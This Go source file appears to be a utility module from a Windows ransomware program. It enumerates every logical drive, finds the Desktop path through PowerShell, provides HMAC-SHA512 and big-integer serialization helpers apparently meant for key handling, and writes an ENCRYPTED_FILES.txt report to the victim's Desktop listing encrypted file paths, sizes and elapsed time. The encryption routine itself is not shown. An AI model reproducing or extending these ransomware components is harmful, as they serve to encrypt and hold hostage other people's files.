package utils

import (
	"bytes"
	"crypto/hmac"
	"crypto/sha512"
	"encoding/binary"
	"io/ioutil"
	"math/big"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"
	"unicode/utf16"

	"golang.org/x/sys/windows"
	"golang.org/x/text/encoding/charmap"
)

type FileInfo struct {
	Path string
	Size int
}

// Returns true if slice contains elementm, false if not
func Contains[T comparable](s []T, e T) bool {
	for _, v := range s {
		if v == e {
			return true
		}
	}
	return false
}

// Decodes byte slice encoded in Code Page 850
func decodePage850(msg []byte) (string, error) {

	reader := charmap.CodePage850.NewDecoder().Reader(bytes.NewReader(msg))

	bytesDecoded, err := ioutil.ReadAll(reader)
	if err != nil {
		return "", err
	}

	return string(bytesDecoded), nil
}

func GetDesktopPath() (string, error) {
	pathBytes, err := exec.Command("Powershell", `[Environment]::GetFolderPath("Desktop")`).Output()
	if err != nil {
		return "", err
	}

	desktopPath, err := decodePage850(pathBytes)
	if err != nil {
		return "", err
	}

	n := len(desktopPath)
	desktopPath = desktopPath[0 : n-2]

	return desktopPath, nil
}

// Computes HMACSHA-512 of a given message and a key
func ComputeHmac512(msg []byte, key []byte) [64]byte {
	var result [64]byte
	hash := hmac.New(sha512.New, key)
	hash.Write(msg)

	copy(result[:], hash.Sum(nil))
	return result
}

// Converts uint16 to Big Endian byte slice
func Serialize16Int(i uint16) []byte {
	out := make([]byte, 2)
	binary.BigEndian.PutUint16(out, i)

	return out
}

// Converts big.Int into Big Endian byte slice
func Serialize256Int(i *big.Int) []byte {
	out := make([]byte, 32)
	i.FillBytes(out)

	return out
}

// Converts Big Endian byte slice to big.Int
func Parse256(sequence []byte) *big.Int {
	return new(big.Int).SetBytes(sequence[:])
}

// Returns slice containing paths for all drives
func GetDrives() []string {
	bufferLength, _ := windows.GetLogicalDriveStrings(0, nil)

	buffer := make([]uint16, bufferLength)
	windows.GetLogicalDriveStrings(bufferLength, &buffer[0])

	s := string(utf16.Decode(buffer))

	return strings.Split(strings.TrimRight(s, "\x00"), "\x00")
}

func GenerateDesktopFiles(encryptedList []FileInfo, startTime time.Time) error {

	var text string = "------ENCRYPTED FILES------\n\n"
	var totalSize int = 0
	var megaBytes string
	desktopPath, err := GetDesktopPath()
	if err != nil {
		return err
	}

	for _, info := range encryptedList {
		text = text + info.Path + " " + strconv.Itoa(info.Size) + " bytes\n"
		totalSize = totalSize + info.Size
	}

	t := time.Now()
	elapsedTime := t.Sub(startTime)

	megaBytes = strconv.FormatFloat(float64(totalSize)/1000, 'f', 2, 64)

	text = text + "\n" + "TOTAL SIZE: " + megaBytes + " MB"
	text = text + "\n" + "TIME ELAPSED: " + strconv.FormatFloat(elapsedTime.Seconds(), 'f', 4, 64) + " s"
	bytes := []byte(text)
	err = os.WriteFile(desktopPath+"/ENCRYPTED_FILES.txt", bytes, 0644)
	if err != nil {
		return err
	}

	return nil
}
